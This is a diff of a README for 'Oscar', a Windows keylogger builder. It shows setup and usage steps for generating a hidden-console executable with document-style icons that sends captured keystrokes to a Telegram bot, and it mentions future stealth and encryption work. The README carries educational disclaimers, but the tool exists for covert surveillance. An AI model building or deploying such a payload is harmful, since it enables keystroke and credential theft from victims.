@@ -7,8 +7,8 @@
 <p align="center">
   <img src="https://img.shields.io/badge/platform-Windows-blue?style=for-the-badge">
   <img src="https://img.shields.io/badge/language-Python%20%2B%20C++-orange?style=for-the-badge">
-  <img src="https://img.shields.io/badge/status-Inactive-yellow?style=for-the-badge">
-  <img src="https://img.shields.io/badge/version-1.0-darkred?style=for-the-badge">
+  <img src="https://img.shields.io/badge/status-Archived-yellow?style=for-the-badge">
+  <img src="https://img.shields.io/badge/origin-1401-darkred?style=for-the-badge">
 </p>
 
 <p align="center">
@@ -17,55 +17,92 @@
 
 ---
 
-> ⚠️ This project has been inactive for around 1–2 years.  
-> A cleaner and improved version is planned for the future.
+# Oscar
 
-Oscar is a customizable Windows payload generator capable of creating a lightweight keylogging executable that sends captured keystrokes directly to your Telegram bot.
+Oscar is an old personal cybersecurity project originally started around **1401** — back when AI assistants weren't writing code, auto-completing architecture, or explaining bugs in seconds.
 
-Built with:
-- **Python** → Builder & configuration interface
-- **C++** → Lightweight payload
+Everything here was built through:
+- trial and error
+- documentation digging
+- broken builds
+- random Stack Overflow threads
+- and long nights staring at terminal windows
+
+At the time, even the keylogging logic itself was originally handled entirely in Python.
+
+As programming knowledge improved over time, the project slowly evolved:
+- Python became the builder/configuration layer
+- C++ replaced the logging core for better performance and lower overhead
+- the payload structure became cleaner and more modular
+
+This repository is basically a snapshot of that learning curve.
+
+Not perfect.
+Not modern.
+But real.
 
 ---
 
 # Disclaimer
 
-This project is intended strictly for:
-- Educational purposes
-- Authorized security testing
-- Malware analysis research
+This repository exists strictly for:
+- educational purposes
+- malware analysis research
+- authorized security testing
 
-Unauthorized keylogging or monitoring of systems without explicit permission is illegal and unethical.
+Unauthorized monitoring, logging, or access to systems you do not own or have explicit permission to test is illegal and unethical.
 
-The author assumes no responsibility for misuse or damages caused by this software.
-
----
-
-# Why "Oscar"?
-
-When this project was first written, the *Moon Knight* series had just dropped.
-
-Oscar Isaac was everywhere.
-
-The name stayed.
-
-No hidden meaning. Just a cool vibe from that era.
+The author assumes no responsibility for misuse or damages caused by this project.
 
 ---
 
 # Features
 
-- Lightweight C++ payload
+- Lightweight C++ keylogging payload
 - Telegram-based log delivery
+- Python builder interface
+- Hidden console window
 - Custom executable icons
   - Excel
   - PDF
   - Word
   - and more...
-- Hidden console window
-- Easy payload generation
-- Python-powered configuration interface
-- Minimal and simple workflow
+- Simple payload generation workflow
+- Minimal dependencies
+- Old-school builder style
+
+---
+
+# Why "Oscar"?
+
+When development first started, the *Moon Knight* series had just released.
+
+Oscar Isaac was everywhere.
+
+The name stuck.
+
+No deeper meaning than that.
+
+Just nostalgia from a different era of coding.
+
+---
+
+# Current Status
+
+> ⚠️ Project inactive for around 1–2 years.
+
+This repository is currently archived in its old state.
+
+A future rewrite may include:
+- cleaner architecture
+- better stealth techniques
+- Linux support
+- encryption
+- modular payload system
+- improved UI/UX
+
+But for now, this project remains mostly as it originally was:
+a record of experimentation, learning, and curiosity.
 
 ---
 
@@ -86,7 +123,7 @@ No hidden meaning. Just a cool vibe from that era.
 
 # Installation
 
-## 1. Clone the repository
+## Clone the repository
 
 ```bash
 git clone https://github.com/Arash-abraham/Oscar.git
@@ -95,7 +132,7 @@ cd Oscar
 
 ---
 
-## 2. Install Python dependencies
+## Install Python dependencies
 
 ```bash
 pip install -r requirements.txt
@@ -103,12 +140,10 @@ pip install -r requirements.txt
 
 ---
 
-## 3. Install MinGW
+## Install MinGW
 
-Download and install:
+Download:
 https://www.mingw-w64.org/
-
-Make sure `g++` is added to PATH.
 
 Verify installation:
 
@@ -118,7 +153,7 @@ g++ --version
 
 ---
 
-## 4. Install libcurl
+## Install libcurl
 
 Clone vcpkg:
 
@@ -133,7 +168,7 @@ Install curl:
 ./vcpkg install curl
 ```
 
-Verify:
+Verify installation:
 
 ```bash
 pkg-config --modversion libcurl
@@ -143,27 +178,27 @@ pkg-config --modversion libcurl
 
 # Usage
 
-## 1. Create a Telegram Bot
+## Create a Telegram Bot
 
 Use:
-- `@BotFather` → Get your Bot Token
-- `@userinfobot` → Get your Chat ID
+- `@BotFather` → obtain your Bot Token
+- `@userinfobot` → obtain your Chat ID
 
 ---
 
-## 2. Launch Oscar
+## Launch Oscar
 
 ```bash
 python Oscar.py
 ```
 
 You will be prompted to:
-- Enter payload name
-- Enter Telegram Bot Token
-- Enter Chat ID
-- Select executable icon
+- enter payload name
+- enter Telegram Bot Token
+- enter Chat ID
+- select executable icon
 
-Generated file:
+Generated executable:
 
 ```bash
 dist/<payload_name>.exe
@@ -171,7 +206,7 @@ dist/<payload_name>.exe
 
 ---
 
-## 3. Run the Payload
+## Run the payload
 
 ```bash
 ./dist/<payload_name>.exe
@@ -224,29 +259,16 @@ pkg-config --modversion libcurl
 
 ## Icon not applied
 
-Make sure icon files exist inside the `icon/` directory.
+Verify icon files exist inside the `icon/` directory.
 
 ---
 
 ## Telegram logs not sending
 
-Verify:
+Double-check:
 - Bot Token
 - Chat ID
 - Internet connection
-
----
-
-# Roadmap
-
-Planned future updates:
-
-- Linux support
-- Better stealth techniques
-- Cleaner UI
-- Payload encryption
-- Modular architecture
-- Builder improvements
 
 ---
 
@@ -255,6 +277,20 @@ Planned future updates:
 - Never expose your Telegram Bot Token
 - Use only in authorized environments
 - Respect local laws and regulations
+
+---
+
+# Final Note
+
+This project was written during a very different time.
+
+Before AI-generated repositories.
+Before one-click copilots.
+Before everything became optimized.
+
+Just curiosity, caffeine, broken code, and persistence.
+
+And honestly, that era had its own charm.
 
 ---
 
